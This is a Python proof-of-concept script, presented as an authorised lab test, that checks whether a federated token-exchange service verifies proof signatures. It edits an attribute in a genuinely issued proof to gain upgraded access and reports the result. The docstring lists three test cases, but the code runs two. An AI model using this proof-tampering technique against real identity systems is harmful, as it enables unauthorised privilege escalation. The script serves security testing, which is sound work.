#!/usr/bin/env python3
"""poc_signature.py — authorised security test (own system, isolated lab) for finding #1:
B's security-attributes provider exchanges a FEDERATED ephemeral proof WITHOUT verifying that the
proof is signed by the trusted authority (A) it names as issuer.

Prerequisites: authority A (:8202) and B (:8302) up and federated (authority.sh A/B + federate.py),
with the BP02D mapping CONSUMER->CONSUMER, EOSC_DESTINE_PARTNER->DESTINE_UPGRADED_ACCESS.

A consumer is onboarded at A holding ONLY `CONSUMER` (no partner attribute, so legitimately no
upgraded access on the DestinE side). A issues it a genuine, A-signed proof. We then send three
things to B's POST /tier2/v2/token/exchange and report what B does with each:

  1. GENUINE          the untouched A proof                         (control; must be accepted)
  2. EDITED PAYLOAD   EOSC_DESTINE_PARTNER added to the proof body,
                      A's original signature left in place          (a secure exchange MUST reject)
  3. BROKEN SIGNATURE genuine body, signature bytes corrupted       (a secure exchange MUST reject)

If (2) yields DESTINE_UPGRADED_ACCESS, a plain consumer elevated itself by editing its own proof.
If (3) is accepted, the signature is not checked at all. Nothing here attacks any third party; it
only edits a proof legitimately issued to this same consumer, against our own lab services."""
import base64
import json
import sys

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography import x509
from cryptography.x509.oid import NameOID
from uuid import uuid4

from exchange import A, B, STATE, call, credential_id, jwt_claims, attr_codes, pop


def onboard_consumer_at_A(attrs):
    """Replicates exchange.py's onboarding so we hold a genuine A-signed proof for `attrs`."""
    org = "University of Example"
    key = ec.generate_private_key(ec.SECP256R1())
    pub_pem = key.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo).decode()
    uid = str(uuid4())
    csr_pem = (x509.CertificateSigningRequestBuilder()
               .subject_name(x509.Name([
                   x509.NameAttribute(NameOID.COMMON_NAME, uid),
                   x509.NameAttribute(NameOID.ORGANIZATION_NAME, org),
                   x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "consumer"),
                   x509.NameAttribute(NameOID.COUNTRY_NAME, "EU")]))
               .sign(key, hashes.SHA256())
               .public_bytes(serialization.Encoding.PEM).decode())

    s, p = call("POST", f"http://localhost:{A['idp']}/tier1/v2/participants",
                {"organization": org, "contactEmail": "consumer@uni.example.eu",
                 "isAuthority": False, "publicGatewayUrl": "http://localhost:8200"})
    assert s < 300, (s, p)
    pid = p["id"]
    call("PUT", f"http://localhost:{A['idp']}/tier1/v2/participants/{pid}/csr", {"csr": csr_pem})
    s, cert = call("POST", f"http://localhost:{A['idp']}/tier1/v2/participants/{pid}/credentials",
                   {"reason": "signature poc"})
    assert s < 300, (s, cert)
    cred_id = credential_id(cert["content"])
    call("PATCH", f"http://localhost:{A['idp']}/tier2/v2/credentials",
         {"newCredentialId": cred_id}, {"Credential-Id": cred_id})
    call("PUT", f"http://localhost:{A['idp']}/tier2/v2/tierOnePublicKey",
         {"publicKey": pub_pem}, {"Credential-Id": cred_id})
    call("PUT", f"http://localhost:{A['sap']}/tier1/v2/participants/{pid}/identityAttributes",
         [{"code": c} for c in attrs])

    for alg in (hashes.SHA1(), hashes.SHA256()):
        s, tok = call("POST", f"http://localhost:{A['sap']}/tier2/v2/token",
                      pop(key, alg), {"Credential-Id": cred_id})
        if s < 300:
            return tok["token"]
    sys.exit("could not obtain an A-signed proof")


def seg_decode(seg):
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def seg_encode(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def edit_payload_change_attribute(proof, old_code, new_code):
    """Raw byte-level replace of an attribute code in the decoded proof body (no JSON round-trip, so
    the body still deserialises exactly as before apart from the one changed string), with A's
    original signature segment left untouched. This is the technique that is known to remain loadable
    by the proof persister, so the request reaches the exchange's trust/signature logic."""
    h, p, sig = proof.split(".")
    raw = seg_decode(p)
    needle = b'"' + old_code.encode() + b'"'
    if needle not in raw:
        sys.exit(f"payload does not contain {needle!r}")
    raw = raw.replace(needle, b'"' + new_code.encode() + b'"')
    return f"{h}.{seg_encode(raw)}.{sig}"


def break_signature(proof):
    h, p, sig = proof.split(".")
    raw = bytearray(seg_decode(sig))
    raw[-1] ^= 0xFF  # flip the last byte so ECDSA verification cannot succeed
    return f"{h}.{p}.{seg_encode(bytes(raw))}"


def send_to_B(proof):
    b_cred = credential_id(json.load(open(f"{STATE}/B/cert.json"))["content"])
    status, body = call("POST", f"http://localhost:{B['sap']}/tier2/v2/token/exchange",
                        {"ephemeralProof": proof}, {"Credential-Id": b_cred})
    codes = attr_codes(jwt_claims(body["token"])) if status < 300 and isinstance(body, dict) and body.get("token") else None
    return status, codes, body


def main():
    print("Onboarding a consumer at A (EOSC) holding ONLY CONSUMER ...")
    genuine = onboard_consumer_at_A(["CONSUMER"])
    print(f"  genuine A proof attributes: {attr_codes(jwt_claims(genuine))}\n")

    cases = [
        ("1 GENUINE          (control, must be accepted)", genuine),
        ("2 EDITED PAYLOAD   (CONSUMER->EOSC_DESTINE_PARTNER, real sig kept; must be rejected)",
         edit_payload_change_attribute(genuine, "CONSUMER", "EOSC_DESTINE_PARTNER")),
    ]
    rows = []
    for label, proof in cases:
        status, codes, body = send_to_B(proof)
        verdict = "ACCEPTED" if status < 300 else f"rejected ({status})"
        detail = f"B attributes: {codes}" if codes is not None else (str(body)[:90])
        rows.append((label, verdict, detail))
        print(f"{label}\n    -> {verdict}   {detail}\n")

    edit_verdict, edit_codes = rows[1][1], rows[1][2]
    print("=" * 72)
    if edit_verdict == "ACCEPTED":
        print("FINDING #1 CONFIRMED END-TO-END over HTTP against B's own exchange endpoint:")
        print("  A consumer holding only CONSUMER edited one attribute string in its own")
        print("  genuine proof (signature left untouched, so it no longer matches the body) and")
        print(f"  B accepted it and minted: {edit_codes}")
        print("  -> the federated exchange does not verify the proof signature; privilege")
        print("     elevation (DESTINE_UPGRADED_ACCESS) by editing an issued proof.")
    else:
        print(f"B rejected the edited proof ({edit_verdict}). Must distinguish signature-")
        print("rejection from a parse failure before concluding — inspect B's sap log.")


if __name__ == "__main__":
    main()
